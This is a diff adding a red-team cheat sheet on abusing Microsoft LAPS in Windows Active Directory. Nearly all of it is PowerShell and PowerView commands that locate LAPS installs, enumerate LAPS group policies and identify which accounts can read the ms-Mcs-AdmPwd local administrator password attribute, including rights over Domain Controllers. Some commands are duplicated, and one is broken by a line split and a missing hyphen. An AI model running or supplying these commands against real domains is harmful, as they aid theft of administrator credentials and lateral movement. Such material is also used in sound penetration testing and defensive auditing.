@@ -1,0 +1,60 @@
+WINDOWS - LAPS ABUSE
+https://rastamouse.me/2018/03/laps---part-1/
+https://rastamouse.me/2018/03/laps-part-2/
+https://www.harmj0y.net/blog/powershell/running-laps-with-powerview/
+https://akijosberryblog.wordpress.com/2019/01/01/malicious-use-of-microsoft-laps/
+
+
+
+Any Host with laps installed will have the following file
+
+AdmPwd.dll
+
+Find the AdmPwd.dll with powershell
+
+gdr -PSProvider 'FileSystem' | %{ls -r $_.root} 2>$null | where { $_.name -eq "AdmPwd.dll"} -verbose
+
+Get-ChildItem ‘c:\program files\LAPS\CSE\Admpwd.dll’
+
+With PowerView, search for any GPO that has LAPS in the display name (Master Branch)
+
+Get-DomainGPO -Identity "*LAPS*"
+
+Within PowerView, see who has read access to ms-Mcs-AdmPwd (LAPS) 
+
+Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs |
+Where-Object {
+($_.ObjectType -like 'ms-Mcs-AdmPwd') -and
+($_.ActiveDirectoryRights -match 'ReadProperty')
+}
+
+Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') }
+
+View LAPS configuration
+https://github.com/PowerShell/GPRegistryPolicyParser
+
+Parse-PolFile "\\IT.GCB.LOCAL\SysVol\IT.GCB.LOCAL\Policies\{C3801BA8-56D9-4F54-B2BD-FE3BF1A71BAA}\Machine\Registry.pol
+
+
+Find who has extended rights over computers/servers/workstations
+
+*****This will give us a list, such as AppServers, Domain Controllers, etc.
+Find-AdmPwdExtendedRights -Identity "*" | fl  
+
+Now we can use that list to find what we want to enumerate e.g.,
+
+Find-AdmPwdExtendedRights -Identity "Domain Controllers" | fl
+
+
+Using PowerView, Get a list of all Object ACLs for OUs of interest (and resolve GUIDs to their display names)
+Filter on ActiveDirectory Rights for ReadProperty
+Filter on ObjectAceType for ms-Mcs-AdmPwd
+
+Get-DomainObjectAcl -SearchBase "LDAP://OU=Workstations,DC=testlab,DC=local" -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.A
+ctiveDirectoryRights -like "*ReadProperty*" } | Select-Object ObjectDN, SecurityIdentifier
+
+Get-DomainObjectAcl -SearchBase "LDAP://OU=Workstations,DC=testlab,DC=local" -ResolveGUIDs | Where Object { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -like "*ReadProperty*" } | Select-Object ObjectDN, SecurityIdentifier
+
+
+
+
